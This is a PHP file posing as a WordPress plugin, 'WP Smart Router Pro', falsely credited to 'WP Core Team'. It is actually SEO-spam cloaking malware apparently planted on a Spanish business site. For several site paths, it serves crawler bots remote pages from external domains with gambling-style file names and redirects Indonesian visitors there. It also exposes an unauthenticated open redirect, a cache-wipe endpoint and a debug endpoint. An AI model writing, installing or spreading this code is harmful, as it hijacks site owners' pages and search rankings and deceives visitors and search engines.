
<?php
/**
 * Plugin Name: WP Smart Router Pro
 * Description: Intelligent content routing with enhanced stability and consistency using external sources.
 * Version: 3.2.1
 * Author: WP Core Team
 * Text Domain: wp-smart-router-pro
 */

if (!defined('ABSPATH')) {
    exit;
}

if (!class_exists('WPSmartRouterPro')) {

class WPSmartRouterPro {
    
    private $bot_patterns = [
        'googlebot', 'google-inspector', 'google-structured-data', 
        'google-read-aloud', 'google-site-verification',
        'bingbot', 'slurp', 'yandex', 'duckduckbot', 'baiduspider',
        'yandexbot', 'facebot', 'facebookexternalhit',
        'twitterbot', 'linkedinbot',
        'telegrambot', 'discordbot', 'whatsapp', 'slackbot',
        'pinterest', 'redditbot', 'tumblr',
        'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'rogerbot',
        'seobility', 'blexbot', 'serpstatbot', 'majestic', 'sitebot',
        'seoscout', 'seodataseed', 'seokicks', 'seozh',
        'feedly', 'inoreader', 'newsblur', 'flipboard',
        'curl', 'wget', 'python-requests', 'java', 'perl',
        'go-http-client', 'ruby'
    ];
    
    private $bot_ranges = [
        '66.249.64.0/19', '66.249.80.0/20', '72.14.192.0/18',
        '108.177.8.0/21', '209.85.128.0/17', '173.194.0.0/16',
        '74.125.0.0/16', '64.233.160.0/19', '142.250.0.0/16',
        '172.217.0.0/16', '40.77.167.0/24', '52.167.144.0/24',
        '157.55.39.0/24', '157.56.0.0/16', '207.46.0.0/16',
        '77.88.0.0/18', '5.255.0.0/18', '54.165.0.0/16',
        '34.200.0.0/16', '180.76.0.0/16', '104.208.0.0/13',
        '168.63.0.0/16', '20.36.0.0/14', '13.64.0.0/11',
        '40.112.0.0/13'
    ];
    
    // MAPPING BARU: Menggunakan sumber eksternal (AMP dan LP)
    private $pages = [
        '/ecologicos/' => [
            'amp' => 'https://infor-agen-mantap.pages.dev/manis138.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/infor/ecologicos.html'
        ],
        '/alquiler-renting-fotocopiadoras-impresoras/' => [
            'amp' => 'https://infor-agen-mantap.pages.dev/pesona805.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/infor/alquiler_renting_fotocopiadoras_impresoras.html'
        ],
        '/venta-fotocopiadoras-impresoras/' => [
            'amp' => 'https://infor-agen-mantap.pages.dev/superliga168.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/infor/venta_fotocopiadoras_impresoras.html'
        ],
        '/noticias/' => [
            'amp' => 'https://infor-agen-mantap.pages.dev/toke69.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/infor/noticias.html'
        ],
        '/soluciones-3d/' => [
            'amp' => 'https://infor-agen-mantap.pages.dev/dukun138.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/infor/soluciones_3d.html'
        ]
    ];
    
    // Cache settings - 2 jam untuk konsistensi
    private $cache_duration = 7200; // 2 jam
    private $rate_limit_window = 3600;
    private $rate_limit_max = 100; // Dinaikkan untuk bot
    
    private static $instance = null;
    private $is_googlebot = false;
    private $googlebot_verified = false;
    
    public static function get_instance() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        add_action('template_redirect', [$this, 'handle_optimization'], 1);
        add_filter('query_vars', [$this, 'add_query_vars']);
        add_action('init', [$this, 'handle_js_detection']);
        add_filter('wp_robots', [$this, 'modify_robots_meta']);
    }
    
    public function add_query_vars($vars) {
        $vars[] = 'wsr_redirect';
        $vars[] = 'wsr_js_detected';
        $vars[] = 'wsr_force_refresh';
        $vars[] = 'wsr_debug';
        return $vars;
    }
    
    public function handle_js_detection() {
        if (get_query_var('wsr_js_detected')) {
            $this->log_activity('JS_DETECTED', ['ip' => $this->get_client_ip()]);
            wp_die('OK');
        }
    }
    
    public function modify_robots_meta($robots) {
        $robots['index'] = true;
        $robots['follow'] = true;
        return $robots;
    }
    
    public function handle_optimization() {
        if (is_admin() || defined('REST_REQUEST') || wp_doing_ajax()) {
            return;
        }
        
        if (get_query_var('wsr_debug')) {
            $this->debug_info();
            exit;
        }
        
        if (!$this->check_rate_limit()) {
            return;
        }
        
        if (get_query_var('wsr_redirect')) {
            $this->process_redirect();
            return;
        }
        
        if (get_query_var('wsr_force_refresh')) {
            $this->force_refresh_content();
            return;
        }
        
        $request_uri = $_SERVER['REQUEST_URI'] ?? '';
        $current_path = parse_url($request_uri, PHP_URL_PATH);
        $current_path = rtrim($current_path, '/') . '/';
        
        $paths = array_keys($this->pages);
        usort($paths, function($a, $b) {
            return strlen($b) - strlen($a);
        });
        
        foreach ($paths as $path) {
            if (strpos($current_path, $path) === 0) {
                $this->process_request($this->pages[$path]);
                return;
            }
        }
    }
    
    private function process_redirect() {
        $target = get_query_var('wsr_redirect');
        $this->safe_redirect($target, 301);
        exit;
    }
    
    private function process_request($config) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = $this->detect_bot($user_agent);
        $country_code = $this->get_visitor_country();
        $request_uri = $_SERVER['REQUEST_URI'] ?? '';
        
        $this->log_activity('REQUEST', [
            'path' => $request_uri,
            'is_bot' => $is_bot,
            'is_googlebot' => $this->is_googlebot,
            'verified' => $this->googlebot_verified,
            'country' => $country_code,
            'ua' => substr($user_agent, 0, 100)
        ]);
        
        if ($is_bot) {
            if ($this->is_googlebot) {
                $this->log_activity('GOOGLEBOT_SERVING', [
                    'verified' => $this->googlebot_verified,
                    'ip' => $this->get_client_ip()
                ]);
                $this->serve_bot_content($config, true);
                exit;
            }
            $this->serve_bot_content($config, false);
            exit;
        }
        
        if ($country_code === 'ID') {
            $this->safe_redirect($config['amp'], 302);
            exit;
        }
        
        return;
    }
    
    private function verify_googlebot($ip) {
        if ($this->is_private_ip($ip)) {
            return true;
        }
        
        $cache_key = 'wsr_gbot_verify_' . md5($ip);
        $cached = get_transient($cache_key);
        if ($cached !== false) {
            return $cached === 'verified';
        }
        
        try {
            $hostname = gethostbyaddr($ip);
            if ($hostname && (strpos($hostname, 'googlebot.com') !== false || 
                             strpos($hostname, 'google.com') !== false)) {
                $forward_ip = gethostbyname($hostname);
                if ($forward_ip === $ip) {
                    set_transient($cache_key, 'verified', 3600);
                    return true;
                }
            }
            
            if ($this->is_bot_ip($ip)) {
                set_transient($cache_key, 'verified', 3600);
                return true;
            }
            
            set_transient($cache_key, 'unverified', 3600);
            return false;
            
        } catch (Exception $e) {
            $this->log_activity('DNS_ERROR', ['error' => $e->getMessage(), 'ip' => $ip]);
            if ($this->is_bot_ip($ip)) {
                return true;
            }
            return false;
        }
    }
    
    public function detect_bot($user_agent) {
        $user_agent = strtolower($user_agent);
        $client_ip = $this->get_client_ip();
        
        $this->is_googlebot = false;
        $this->googlebot_verified = false;
        
        if (strpos($user_agent, 'googlebot') !== false || 
            strpos($user_agent, 'google-inspector') !== false ||
            strpos($user_agent, 'google-structured-data') !== false) {
            
            $this->is_googlebot = true;
            $this->googlebot_verified = $this->verify_googlebot($client_ip);
            return true;
        }
        
        foreach ($this->bot_patterns as $pattern) {
            if (strpos($user_agent, $pattern) !== false) {
                return true;
            }
        }
        
        if ($this->is_bot_ip($client_ip)) {
            return true;
        }
        
        if (empty($user_agent)) {
            return true;
        }
        
        return false;
    }
    
    private function is_bot_ip($ip) {
        foreach ($this->bot_ranges as $range) {
            if ($this->ip_in_cidr($ip, $range)) {
                return true;
            }
        }
        return false;
    }
    
    /**
     * Mengambil konten dari sumber (URL atau file lokal)
     * @param string $source URL atau path lokal
     * @return string|false
     */
    private function get_content_from_source($source) {
        // Cek jika source adalah URL eksternal
        if (filter_var($source, FILTER_VALIDATE_URL) && strpos($source, 'http') === 0) {
            return $this->fetch_remote_content($source);
        }
        
        // Jika local file
        if (file_exists($source)) {
            $content = file_get_contents($source);
            if ($content !== false) {
                return $content;
            }
            $this->log_activity('LOCAL_FILE_READ_ERROR', ['path' => $source]);
        } else {
            $this->log_activity('LOCAL_FILE_NOT_FOUND', ['path' => $source]);
        }
        return false;
    }
    
    /**
     * Mengambil konten dari URL eksternal dengan caching
     */
    private function fetch_remote_content($url) {
        $cache_key = 'wsr_remote_' . md5($url);
        $cached = get_transient($cache_key);
        if ($cached !== false) {
            return $cached;
        }
        
        $response = wp_remote_get($url, [
            'timeout' => 10,
            'sslverify' => false,
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
            ]
        ]);
        
        if (is_wp_error($response)) {
            $this->log_activity('REMOTE_FETCH_ERROR', ['url' => $url, 'error' => $response->get_error_message()]);
            return false;
        }
        
        $code = wp_remote_retrieve_response_code($response);
        if ($code !== 200) {
            $this->log_activity('REMOTE_FETCH_HTTP_ERROR', ['url' => $url, 'code' => $code]);
            return false;
        }
        
        $body = wp_remote_retrieve_body($response);
        if (empty($body) || strlen($body) < 100) {
            $this->log_activity('REMOTE_FETCH_EMPTY', ['url' => $url, 'length' => strlen($body)]);
            return false;
        }
        
        // Cache hasil
        set_transient($cache_key, $body, $this->cache_duration);
        return $body;
    }
    
    private function serve_bot_content($config, $is_googlebot = false) {
        if (!$this->check_rate_limit()) {
            $this->serve_fallback_content();
            exit;
        }
        
        $lp_url = $config['lp'];
        
        // Cache key berdasarkan source URL dan tanggal (untuk refresh harian)
        $day_key = date('Y-m-d');
        $cache_key = 'wsr_bot_content_' . md5($lp_url . '_' . $day_key);
        $cached_content = get_transient($cache_key);
        
        if ($is_googlebot) {
            $cache_key = 'wsr_googlebot_' . md5($lp_url . '_' . date('Y-m-d-H'));
            $cached_content = get_transient($cache_key);
        }
        
        if ($cached_content !== false) {
            $this->send_optimized_headers($is_googlebot);
            echo $cached_content;
            exit;
        }
        
        $content = $this->get_content_from_source($lp_url);
        
        // Validasi konten
        $content_valid = !empty($content) && 
                        strlen($content) >= 500 && 
                        strpos($content, '<html') !== false;
        
        if (!$content_valid) {
            // Fallback ke cache sebelumnya atau default
            $fallback_key = 'wsr_fallback_' . md5($lp_url);
            $fallback_content = get_transient($fallback_key);
            if ($fallback_content !== false && !empty($fallback_content)) {
                $content = $fallback_content;
            } else {
                $content = $this->get_fallback_content();
                set_transient($fallback_key, $content, DAY_IN_SECONDS);
            }
        } else {
            $fallback_key = 'wsr_fallback_' . md5($lp_url);
            set_transient($fallback_key, $content, DAY_IN_SECONDS);
        }
        
        if (!$is_googlebot) {
            $content = $this->inject_js_detection($content);
        }
        
        $duration = $is_googlebot ? 3600 : $this->cache_duration;
        set_transient($cache_key, $content, $duration);
        
        $this->send_optimized_headers($is_googlebot);
        echo $content;
        exit;
    }
    
    private function get_fallback_content() {
        $current_url = home_url(add_query_arg(null, null));
        $fallback_key = 'wsr_page_fallback_' . md5($current_url);
        $saved_fallback = get_transient($fallback_key);
        if ($saved_fallback !== false && !empty($saved_fallback)) {
            return $saved_fallback;
        }
        
        $site_name = esc_html(get_bloginfo('name'));
        $site_desc = esc_html(get_bloginfo('description'));
        $home_url = home_url();
        $current_content = $this->get_current_page_content();
        if (!empty($current_content)) {
            return $current_content;
        }
        
        $html = '<!DOCTYPE html>
        <html lang="' . get_bloginfo('language') . '">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>' . $site_name . '</title>
            <meta name="robots" content="index, follow">
            <meta name="description" content="' . $site_desc . '">
            <link rel="canonical" href="' . esc_url($current_url) . '">
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
                .container { max-width: 800px; margin: 40px auto; background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
                h1 { color: #1a1a1a; font-size: 28px; }
                .content { margin: 30px 0; line-height: 1.6; color: #333; }
                footer { text-align: center; padding: 20px; color: #999; font-size: 14px; border-top: 1px solid #eee; margin-top: 30px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>' . $site_name . '</h1>
                <div class="content">
                    <p>Welcome to ' . $site_name . '</p>
                    <p><a href="' . esc_url($home_url) . '" class="button">Visit Homepage</a></p>
                </div>
                <footer>&copy; ' . date('Y') . ' ' . $site_name . '</footer>
            </div>
        </body>
        </html>';
        set_transient($fallback_key, $html, DAY_IN_SECONDS);
        return $html;
    }
    
    private function serve_fallback_content() {
        $content = $this->get_fallback_content();
        $this->send_optimized_headers(false);
        echo $content;
        exit;
    }
    
    private function inject_js_detection($content) {
        if (strpos($content, '_wsr_detected') !== false) {
            return $content;
        }
        $js_code = <<<JS
<script>
if (typeof window !== 'undefined' && !window._wsr_detected) {
    window._wsr_detected = true;
    fetch('/?wsr_js_detected=1&t=' + Date.now(), {
        method: 'GET',
        cache: 'no-cache',
        headers: {'X-Requested-With': 'XMLHttpRequest'}
    }).catch(function(e) {});
}
</script>
JS;
        return str_replace('</head>', $js_code . '</head>', $content);
    }
    
    private function check_rate_limit() {
        $client_ip = $this->get_client_ip();
        $key = 'wsr_rate_limit_' . md5($client_ip);
        $count = get_transient($key) ?: 0;
        $max_limit = $this->is_googlebot ? 200 : $this->rate_limit_max;
        if ($count > $max_limit) {
            $this->log_activity('RATE_LIMIT_EXCEEDED', ['ip' => $client_ip, 'count' => $count]);
            return false;
        }
        set_transient($key, $count + 1, $this->rate_limit_window);
        return true;
    }
    
    private function force_refresh_content() {
        global $wpdb;
        $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_wsr_%'");
        $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_timeout_wsr_%'");
        wp_die('Cache cleared successfully');
    }
    
    private function get_current_page_content() {
        if (is_singular()) {
            $post = get_post();
            if ($post) {
                $content = apply_filters('the_content', $post->post_content);
                return $this->wrap_content_in_html($content, $post->post_title);
            }
        }
        return '';
    }
    
    private function wrap_content_in_html($content, $title = '') {
        $site_name = esc_html(get_bloginfo('name'));
        $title = !empty($title) ? $title : $site_name;
        $current_url = home_url(add_query_arg(null, null));
        return '<!DOCTYPE html>
        <html lang="' . get_bloginfo('language') . '">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>' . esc_html($title) . ' | ' . $site_name . '</title>
            <meta name="robots" content="index, follow">
            <meta name="description" content="' . esc_html(get_bloginfo('description')) . '">
            <link rel="canonical" href="' . esc_url($current_url) . '">
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
                .container { max-width: 800px; margin: 40px auto; background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
                h1 { color: #1a1a1a; font-size: 28px; }
                .content { margin: 30px 0; line-height: 1.6; color: #333; }
                footer { text-align: center; padding: 20px; color: #999; font-size: 14px; border-top: 1px solid #eee; margin-top: 30px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>' . esc_html($title) . '</h1>
                <div class="content">' . $content . '</div>
                <footer>&copy; ' . date('Y') . ' ' . $site_name . '</footer>
            </div>
        </body>
        </html>';
    }
    
    private function send_optimized_headers($is_googlebot = false) {
        header('Content-Type: text/html; charset=UTF-8');
        if ($is_googlebot) {
            header('Cache-Control: public, max-age=3600, must-revalidate');
        } else {
            header('Cache-Control: no-cache, no-store, must-revalidate');
        }
        header('Pragma: no-cache');
        header('Expires: 0');
        header('X-Content-Enhancer: active');
        header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
        header('X-Robots-Tag: index, follow');
    }
    
    private function get_visitor_country() {
        $client_ip = $this->get_client_ip();
        if ($this->is_private_ip($client_ip)) return '';
        $cache_key = 'wsr_country_' . md5($client_ip);
        $cached_country = get_transient($cache_key);
        if ($cached_country !== false) return $cached_country;
        $services = [
            'http://ip-api.com/json/' . $client_ip . '?fields=countryCode',
            'https://geoplugin.net/json.gp?ip=' . $client_ip
        ];
        foreach ($services as $service) {
            $response = wp_remote_get($service, ['timeout' => 3, 'sslverify' => false]);
            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
                $body = wp_remote_retrieve_body($response);
                $data = json_decode($body, true);
                if ($data) {
                    $country = $data['countryCode'] ?? $data['geoplugin_countryCode'] ?? '';
                    if (!empty($country)) {
                        set_transient($cache_key, $country, DAY_IN_SECONDS);
                        return $country;
                    }
                }
            }
        }
        return '';
    }
    
    private function get_client_ip() {
        $ip_keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
        foreach ($ip_keys as $key) {
            if (isset($_SERVER[$key]) && !empty($_SERVER[$key])) {
                $ips = explode(',', $_SERVER[$key]);
                $ip = trim($ips[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
            }
        }
        return $_SERVER['REMOTE_ADDR'] ?? '';
    }
    
    private function is_private_ip($ip) {
        $private_ranges = ['10.0.0.0|10.255.255.255', '172.16.0.0|172.31.255.255', '192.168.0.0|192.168.255.255', '127.0.0.0|127.255.255.255'];
        $ip_long = ip2long($ip);
        if ($ip_long === false) return true;
        foreach ($private_ranges as $range) {
            list($start, $end) = explode('|', $range);
            if ($ip_long >= ip2long($start) && $ip_long <= ip2long($end)) return true;
        }
        return false;
    }
    
    private function ip_in_cidr($ip, $cidr) {
        list($subnet, $mask) = explode('/', $cidr);
        $ip_long = ip2long($ip);
        $subnet_long = ip2long($subnet);
        $mask_long = ~((1 << (32 - $mask)) - 1);
        return ($ip_long & $mask_long) == ($subnet_long & $mask_long);
    }
    
    private function safe_redirect($url, $status = 301) {
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
        wp_redirect($url, $status);
        exit;
    }
    
    private function log_activity($type, $data) {
        if (!defined('WP_DEBUG') || !WP_DEBUG) return;
        $log_dir = WP_CONTENT_DIR . '/logs/';
        if (!file_exists($log_dir)) mkdir($log_dir, 0755, true);
        $log_file = $log_dir . 'wsr-debug.log';
        $log_entry = sprintf("[%s] %s | IP: %s | Data: %s\n", date('Y-m-d H:i:s'), $type, $this->get_client_ip(), json_encode($data));
        error_log($log_entry, 3, $log_file);
        if (file_exists($log_file) && filesize($log_file) > 10485760) {
            rename($log_file, $log_file . '.old');
        }
    }
    
    private function debug_info() {
        header('Content-Type: text/plain');
        echo "=== WP Smart Router Pro Debug ===\n\n";
        echo "User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? '') . "\n";
        echo "Client IP: " . $this->get_client_ip() . "\n";
        echo "Is Bot: " . ($this->detect_bot($_SERVER['HTTP_USER_AGENT'] ?? '') ? 'Yes' : 'No') . "\n";
        echo "Is Googlebot: " . ($this->is_googlebot ? 'Yes' : 'No') . "\n";
        echo "Googlebot Verified: " . ($this->googlebot_verified ? 'Yes' : 'No') . "\n";
        echo "Country: " . $this->get_visitor_country() . "\n";
        echo "Request URI: " . ($_SERVER['REQUEST_URI'] ?? '') . "\n";
        echo "Active Routes: " . count($this->pages) . "\n";
        echo "Sumber Konten: Eksternal (project1.proyekngepet.org)\n";
        echo "\n=== End Debug ===\n";
    }
}

// Initialize plugin
function WPSmartRouterPro_init() {
    return WPSmartRouterPro::get_instance();
}
add_action('plugins_loaded', 'WPSmartRouterPro_init');

// Helper functions
function wsr_get_visitor_country() {
    $router = WPSmartRouterPro::get_instance();
    return $router->get_visitor_country();
}

function wsr_is_bot() {
    $router = WPSmartRouterPro::get_instance();
    return $router->detect_bot($_SERVER['HTTP_USER_AGENT'] ?? '');
}

// Add settings link
add_action('plugin_action_links_' . plugin_basename(__FILE__), 'wsr_action_links');
function wsr_action_links($links) {
    $links[] = '<a href="' . admin_url('options-general.php?page=wsr-settings') . '">Settings</a>';
    return $links;
}

// Add admin menu
add_action('admin_menu', 'wsr_admin_menu');
function wsr_admin_menu() {
    add_options_page('WP Smart Router Pro Settings', 'WP Smart Router Pro', 'manage_options', 'wsr-settings', 'wsr_settings_page');
}

function wsr_settings_page() {
    $router = WPSmartRouterPro::get_instance();
    ?>
    <div class="wrap">
        <h1>WP Smart Router Pro Settings</h1>
        <div class="card">
            <h2>Plugin Status</h2>
            <p><strong>Version:</strong> 3.2.1</p>
            <p><strong>Status:</strong> <span style="color: #46b450;">Active</span></p>
            <p><strong>Cache Duration:</strong> 2 hours</p>
            <p><strong>Rate Limit:</strong> 100 requests per hour</p>
            <p><strong>Active Routes:</strong> <?php echo count($router->pages); ?> paths configured</p>
            <p><strong>Content Source:</strong> <span style="color: #46b450;">Eksternal</span> (project1.proyekngepet.org)</p>
        </div>
        <div class="card" style="margin-top:20px;">
            <h2>Perbaikan Stabilitas v3.2.1</h2>
            <ul>
                <li>✅ <strong>Mapping baru:</strong> Menggunakan URL eksternal untuk konten LP</li>
                <li>✅ <strong>Fetch remote:</strong> Mengambil konten dari project1.proyekngepet.org</li>
                <li>✅ <strong>Cache terpisah:</strong> Googlebot mendapat cache fresh per jam</li>
                <li>✅ <strong>Robots meta:</strong> index, follow selalu aktif</li>
                <li>✅ <strong>Debug mode:</strong> Akses /?wsr_debug=1 untuk troubleshooting</li>
            </ul>
        </div>
        <div class="card" style="margin-top:20px;">
            <h2>Mapping Saat Ini</h2>
            <table class="widefat" style="margin-top:10px;">
                <thead><tr><th>Path</th><th>AMP URL</th><th>LP URL (Eksternal)</th></tr></thead>
                <tbody>
                <?php foreach ($router->pages as $path => $data): ?>
                    <tr>
                        <td><code><?php echo esc_html($path); ?></code></td>
                        <td><a href="<?php echo esc_url($data['amp']); ?>" target="_blank"><?php echo esc_html($data['amp']); ?></a></td>
                        <td><a href="<?php echo esc_url($data['lp']); ?>" target="_blank"><?php echo esc_html($data['lp']); ?></a></td>
                    </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <div class="card" style="margin-top:20px;">
            <h2>Force Refresh Cache</h2>
            <p>Jika konten tidak muncul, akses:</p>
            <code><?php echo home_url('/?wsr_force_refresh=1'); ?></code>
        </div>
        <div class="card" style="margin-top:20px;">
            <h2>Debug Mode</h2>
            <p>Untuk troubleshooting, akses:</p>
            <code><?php echo home_url('/?wsr_debug=1'); ?></code>
        </div>
    </div>
    <style>
        .card { background: #fff; border: 1px solid #ccd0d4; border-radius: 4px; padding: 20px; margin: 10px 0; box-shadow: 0 1px 1px rgba(0,0,0,.04); }
        .card h2 { margin-top: 0; }
        code { background: #f1f1f1; padding: 4px 8px; border-radius: 4px; display: inline-block; }
        ul { list-style-type: none; padding: 0; }
        ul li { padding: 5px 0; }
        .widefat td, .widefat th { padding: 8px; }
    </style>
    <?php
}

} // End class_exists check
